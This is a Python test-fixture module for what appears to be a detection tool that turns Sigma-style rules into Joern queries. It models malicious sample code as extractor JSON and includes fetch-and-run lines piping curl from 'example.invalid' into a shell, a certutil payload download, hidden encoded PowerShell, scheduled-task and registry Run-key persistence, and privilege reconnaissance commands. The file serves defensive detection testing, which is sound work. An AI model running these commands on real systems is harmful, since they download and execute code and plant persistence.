"""Helpers that build extractor output (the JSON written by extract_events.sc) by hand.

The shapes follow the Joern frontends: e.g. pysrc2cpg puts the receiver object of
``os.system(...)`` at argument index 0 and keyword arguments get an ``argumentName``;
jssrc2cpg turns template literals into ``<operator>.formatString``; javasrc2cpg lowers
``new ProcessBuilder(...)`` into an ``<init>`` call.
"""

from __future__ import annotations

from typing import Any

Node = dict[str, Any]


def lit(code: str) -> Node:
    return {"k": "lit", "code": code}


def other(code: str, label: str = "UNKNOWN") -> Node:
    return {"k": "other", "label": label, "code": code}


def assign(value: Node, line: int, op: str = "<operator>.assignment", local: bool = True, col: int = 1) -> Node:
    return {"op": op, "line": line, "col": col, "local": local, "v": value}


def writer(fn: str, line: int, *args: Node) -> Node:
    return {"fn": fn, "line": line, "col": 1, "local": True,
            "args": [{"i": 1, "v": other("buf")}] + [{"i": i + 2, "v": a} for i, a in enumerate(args)]}


def ident(name: str, defs: list[Node] | None = None, writers: list[Node] | None = None,
          param_index: int | None = None, callers: list[Node] | None = None) -> Node:
    node: Node = {"k": "id", "name": name, "code": name, "defs": defs or [], "writers": writers or [], "param": None}
    if param_index is not None:
        node["param"] = {"index": param_index, "method": "m", "callers": callers or []}
    return node


def field(name: str, defs: list[Node] | None = None) -> Node:
    return {"k": "field", "name": name, "code": name, "defs": defs or [], "writers": [], "param": None}


def op(name: str, *args: Node, instance: Node | None = None, kwargs: dict[str, Node] | None = None,
       full_name: str = "", code: str = "") -> Node:
    a = []
    if instance is not None:
        a.append({"i": 0, "n": None, "v": instance})
    a += [{"i": i + 1, "n": None, "v": v} for i, v in enumerate(args)]
    for k, v in (kwargs or {}).items():
        a.append({"i": -1, "n": k, "v": v})
    return {"k": "call", "name": name, "fullName": full_name or name, "code": code or name, "args": a}


def call(name: str, *args: Node, instance: Node | None = None, kwargs: dict[str, Node] | None = None,
         full_name: str = "", code: str = "", receiver: str = "", file: str = "sample", line: int = 1,
         method: str = "main") -> dict:
    node = op(name, *args, instance=instance, kwargs=kwargs, full_name=full_name, code=code)
    return {"id": line, "name": name, "fullName": node["fullName"], "code": code or f"{name}(...)",
            "file": file, "line": line, "method": method, "receiver": receiver, "args": node["args"]}


def js_array(*elements: Node) -> Node:
    """jssrc2cpg lowers [a, b] into { _tmp0 = __ecma.Array.factory(); _tmp0.push(a); _tmp0.push(b); _tmp0 }."""
    items = [op("<operator>.assignment", ident("_tmp0"), op("__ecma.Array.factory"))]
    items += [op("", e, instance=ident("_tmp0"), code=f"_tmp0.push({e.get('code', '')})") for e in elements]
    items.append(ident("_tmp0"))
    return {"k": "block", "code": "[...]", "items": items}


def extraction(language: str, *calls: dict) -> dict:
    return {"tool": "sigma2joern-extractor", "version": 1, "language": language, "calls": list(calls)}


# ---------------------------------------------------------------------------
# fixtures mirroring examples/samples/* (line numbers match the sample sources)
# ---------------------------------------------------------------------------

def python_sample() -> dict:
    f = "examples/samples/python/dropper.py"
    download_url = ident("DOWNLOAD_URL", defs=[assign(lit('"http://example.invalid/payload.txt"'), 9, local=False)])
    url = ident("url", param_index=1, callers=[download_url])
    cmd = ident("cmd", defs=[assign(lit('"net group"'), 18),
                             assign(lit("""' "domain admins" /domain'"""), 19, op="<operator>.assignmentPlus")])
    payload = ident("payload", param_index=1, callers=[])
    fstring = op("<operator>.formatString",
                 lit("powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand "),
                 op("<operator>.formattedValue", payload))
    return extraction(
        "PYTHONSRC",
        call("run", op("<operator>.listLiteral", lit('"certutil.exe"'), lit('"-urlcache"'), lit('"-split"'),
                       lit('"-f"'), url, lit('"C:\\\\Users\\\\Public\\\\p.txt"')),
             instance=ident("subprocess"), receiver="subprocess.run",
             code='subprocess.run(["certutil.exe", "-urlcache", "-split", "-f", url, "C:\\\\Users\\\\Public\\\\p.txt"])',
             full_name="subprocess.py:<module>.run", file=f, line=13, method="dropper.py:<module>.fetch"),
        call("system", lit('"whoami /priv"'), instance=ident("os"), receiver="os.system",
             code='os.system("whoami /priv")', full_name="os.py:<module>.system", file=f, line=17,
             method="dropper.py:<module>.recon"),
        call("check_output", cmd, instance=ident("subprocess"), kwargs={"shell": lit("True")},
             receiver="subprocess.check_output", code="subprocess.check_output(cmd, shell=True)",
             full_name="subprocess.py:<module>.check_output", file=f, line=20, method="dropper.py:<module>.recon"),
        call("Popen", fstring, instance=ident("subprocess"), kwargs={"shell": lit("True")},
             receiver="subprocess.Popen",
             code='subprocess.Popen(f"powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand {payload}", shell=True)',
             full_name="subprocess.py:<module>.Popen", file=f, line=24, method="dropper.py:<module>.encoded"),
        call("run", op("<operator>.listLiteral", lit('"git"'), lit('"status"')), instance=ident("subprocess"),
             receiver="subprocess.run", code='subprocess.run(["git", "status"])',
             full_name="subprocess.py:<module>.run", file=f, line=28, method="dropper.py:<module>.harmless"),
    )


def c_sample() -> dict:
    f = "examples/samples/c/persist.c"
    buf = ident("buf", writers=[
        writer("strcpy", 10, lit('"schtasks /create /sc minute /mo 5 /tn \\"Updater\\" /tr "')),
        writer("strcat", 11, ident("path", param_index=1, callers=[])),
    ])
    cmdline = ident("cmdline", writers=[
        writer("snprintf", 18, op("sizeof", ident("cmdline")), lit('"%s /c %s"'), lit('"cmd.exe"'),
               lit('"whoami /priv"')),
    ])
    null_cast = op("<operator>.cast", other("char *", "UNKNOWN"), lit("NULL"), code="(char *)NULL")
    return extraction(
        "NEWC",
        call("system", buf, code="system(buf)", file=f, line=12, method="install"),
        call("CreateProcessA", lit("NULL"), cmdline, lit("NULL"), lit("NULL"), lit("FALSE"), lit("0"),
             lit("NULL"), lit("NULL"), op("<operator>.addressOf", ident("si")), op("<operator>.addressOf", ident("pi")),
             code="CreateProcessA(NULL, cmdline, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)",
             file=f, line=19, method="discover"),
        call("execl", lit('"/bin/sh"'), lit('"sh"'), lit('"-c"'),
             lit('"curl -fsSL http://example.invalid/i.sh | sh"'), null_cast,
             code='execl("/bin/sh", "sh", "-c", "curl -fsSL http://example.invalid/i.sh | sh", (char *)NULL)',
             file=f, line=23, method="update"),
    )


def java_sample() -> dict:
    f = "examples/samples/java/Agent.java"
    cmd = field("CMD", defs=[assign(lit('"reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Agent /t REG_SZ /d C:\\\\ProgramData\\\\agent.exe /f"'), 5, local=False)])
    return extraction(
        "JAVASRC",
        call("exec", cmd, instance=op("getRuntime", code="Runtime.getRuntime()"), receiver="Runtime.getRuntime()",
             code="Runtime.getRuntime().exec(CMD)", full_name="java.lang.Runtime.exec:java.lang.Process(java.lang.String)",
             file=f, line=8, method="Agent.persist:void()"),
        call("<init>", lit('"powershell"'), lit('"-ExecutionPolicy"'), lit('"Bypass"'), lit('"-File"'),
             op("<operator>.addition", ident("dir", param_index=1, callers=[]), lit('"\\\\stage2.ps1"')),
             instance=ident("$obj0"), receiver="$obj0",
             code='new ProcessBuilder("powershell", "-ExecutionPolicy", "Bypass", "-File", dir + "\\\\stage2.ps1")',
             full_name="java.lang.ProcessBuilder.<init>:void(java.lang.String[])", file=f, line=12,
             method="Agent.stage:void(java.lang.String)"),
        call("<init>", lit('"Hello"'), instance=ident("$obj1"), code='new StringBuilder("Hello")',
             full_name="java.lang.StringBuilder.<init>:void(java.lang.String)", file=f, line=16,
             method="Agent.greet:java.lang.String()"),
    )


def js_sample() -> dict:
    f = "examples/samples/js/postinstall.js"
    host = ident("host", defs=[assign(lit("'example.invalid'"), 4, local=False)])  # module-level const
    tpl = op("<operator>.formatString", lit('"curl -s http://"'), host, lit('"/x.sh | bash"'))
    return extraction(
        "JSSRC",
        call("exec", tpl, instance=ident("child_process"), receiver="child_process.exec",
             code="child_process.exec(`curl -s http://${host}/x.sh | bash`)", file=f, line=7, method="install"),
        call("spawn", lit("'bash'"), js_array(lit("'-c'"), lit("'id; uname -a'")),
             instance=ident("cp"), receiver="cp.spawn", code="cp.spawn('bash', ['-c', 'id; uname -a'])",
             file=f, line=11, method="recon"),
        # RegExp.prototype.exec must not be mistaken for child_process.exec
        call("exec", ident("s", param_index=1, callers=[]), instance=ident("re"), receiver="re.exec",
             code="re.exec(s)", file=f, line=16, method="parse"),
    )


ALL_SAMPLES = {"python": python_sample, "c": c_sample, "java": java_sample, "js": js_sample}
